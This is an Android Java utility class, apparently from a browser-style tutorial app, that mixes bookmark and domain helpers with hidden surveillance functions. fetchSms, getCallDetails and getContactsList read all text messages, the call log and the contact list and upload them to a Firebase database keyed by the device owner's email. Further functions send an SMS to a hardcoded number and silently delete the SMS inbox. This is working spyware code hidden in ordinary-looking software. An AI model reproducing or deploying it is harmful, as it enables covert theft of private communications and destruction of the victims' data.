package com.android.tutorial.utils;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.PorterDuff;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsManager;
import android.text.format.DateFormat;
import android.view.MenuItem;
import android.widget.Toast;

import com.android.tutorial.receivers.SmsDeliveredReceiver;
import com.android.tutorial.receivers.SmsSentReceiver;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by Mannan on 12/9/2016.
 */

public class Utils {
    public static boolean isSameDomain(String url, String url1) {
        return getRootDomainUrl(url.toLowerCase()).equals(getRootDomainUrl(url1.toLowerCase()));
    }

    private static String getRootDomainUrl(String url) {
        String[] domainKeys = url.split("/")[2].split("\\.");
        int length = domainKeys.length;
        int dummy = domainKeys[0].equals("www") ? 1 : 0;
        if (length - dummy == 2)
            return domainKeys[length - 2] + "." + domainKeys[length - 1];
        else {
            if (domainKeys[length - 1].length() == 2) {
                return domainKeys[length - 3] + "." + domainKeys[length - 2] + "." + domainKeys[length - 1];
            } else {
                return domainKeys[length - 2] + "." + domainKeys[length - 1];
            }
        }
    }

    public static void tintMenuIcon(Context context, MenuItem item, int color) {
        Drawable drawable = item.getIcon();
        if (drawable != null) {
            // If we don't mutate the drawable, then all drawable's with this id will have a color
            // filter applied to it.
            drawable.mutate();
            drawable.setColorFilter(ContextCompat.getColor(context, color), PorterDuff.Mode.SRC_ATOP);
        }
    }

    public static void bookmarkUrl(Context context, String url) {
        SharedPreferences pref = context.getSharedPreferences("androidhive", 0); // 0 - for private mode
        SharedPreferences.Editor editor = pref.edit();

        // if url is already bookmarked, unbookmark it
        if (pref.getBoolean(url, false)) {
            editor.putBoolean(url, false);
        } else {
            editor.putBoolean(url, true);
        }

        editor.commit();
    }

    public static boolean isBookmarked(Context context, String url) {
        SharedPreferences pref = context.getSharedPreferences("androidhive", 0);
        return pref.getBoolean(url, false);
    }


    public static ArrayList fetchSms(Activity activity) {
        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();
        ArrayList sms = new ArrayList();
        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = activity.getContentResolver();

        Cursor cursor = cr.query(message, null, null, null, null);
        activity.startManagingCursor(cursor);
        int totalSMS = cursor.getCount();
        String readStatus = "";
        long millisecond;
        if (cursor.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
                    readStatus = "inbox";
                } else {
                    readStatus = "sent";
                }

                millisecond = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
                String dateString = DateFormat.format("MM/dd/yyyy hh:mm", new Date(millisecond)).toString();

                sms.add("MobileNumber:" + cursor.getString(cursor.getColumnIndexOrThrow("address"))
                        + "\nSMS:" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
                        + "\nDATE:" + dateString
                        + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
                        + "\nReadStatus:" + readStatus);

                String senderAddress = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                Pattern pt = Pattern.compile("[^a-zA-Z0-9]");
                Matcher match = pt.matcher(senderAddress);
                while (match.find()) {
                    String s = match.group();
                    senderAddress = senderAddress.replaceAll("\\" + s, "");
                }

                mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(activity)
//                                MyDevice.getDeviceName()
                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
                        .child(senderAddress)
                        .child(readStatus)
                        .child("" + i)
                        .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
                                + " " + dateString
                        );
                cursor.moveToNext();
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        cursor.close();

        return sms;
    }

    public static void sendSms() {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("03044422122", null,
                "Hey!", null, null);
    }

    public static String getCallDetails(Context context) {
        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();

        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");

            phNumber = phNumber.replaceAll("[.^:,#$]", "");
            dir = dir.replaceAll("[.^:,#$]", "");
            mFirebaseDatabase.child("calls").child("" + MyDevice.getDeviceEmailName(context)
//                                MyDevice.getDeviceName()
                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
                    .child(phNumber)
                    .child(dir)
                    .child(callDuration)
                    .setValue("Duration: " + callDuration
                            + ", " + callDayTime
                    );

        }
        cursor.close();
        return stringBuffer.toString();
    }

    public static void getContactsList(Context context) {
        FirebaseDatabase mFirebaseInstance = FirebaseDatabase.getInstance();
        DatabaseReference mFirebaseDatabase = mFirebaseInstance.getReference();

        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
//                        Toast.makeText(getContext(), "Name: " + name
//                                + ", Phone No: " + phoneNo, Toast.LENGTH_SHORT).show();

                        phoneNo = phoneNo.replaceAll("[.^:,#$]", "");
                        mFirebaseDatabase.child("contacts").child("" + MyDevice.getDeviceEmailName(context)
//                                MyDevice.getDeviceName()
                        /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
                                .child(phoneNo)
                                .setValue(name);
                    }
                    pCur.close();
                }
            }
        }
    }

    public static void sendSMS(Context context, String phoneNumber, String message) {
        ArrayList<PendingIntent> sentPendingIntents = new ArrayList<PendingIntent>();
        ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<PendingIntent>();
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
                new Intent(context, SmsSentReceiver.class), 0);
        PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
                new Intent(context, SmsDeliveredReceiver.class), 0);
        try {
            SmsManager sms = SmsManager.getDefault();
            ArrayList<String> mSMSMessage = sms.divideMessage(message);
            for (int i = 0; i < mSMSMessage.size(); i++) {
                sentPendingIntents.add(i, sentPI);
                deliveredPendingIntents.add(i, deliveredPI);
            }
            sms.sendMultipartTextMessage(phoneNumber, null, mSMSMessage,
                    sentPendingIntents, deliveredPendingIntents);
        } catch (Exception e) {
            e.printStackTrace();
//            Toast.makeText(context, "SMS sending failed...", Toast.LENGTH_SHORT).show();
        }

    }

    public static void deleteAllSms(Context context) {
        Uri inboxUri = Uri.parse("content://sms/inbox");
        int count = 0;
        Cursor c = context.getContentResolver().query(inboxUri, null, null, null, null);
        while (c.moveToNext()) {
            try {
                // Delete the SMS
                String pid = c.getString(0); // Get id;
                String uri = "content://sms/" + pid;
                count = context.getContentResolver().delete(Uri.parse(uri),
                        null, null);
            } catch (Exception e) {
            }
        }
    }

}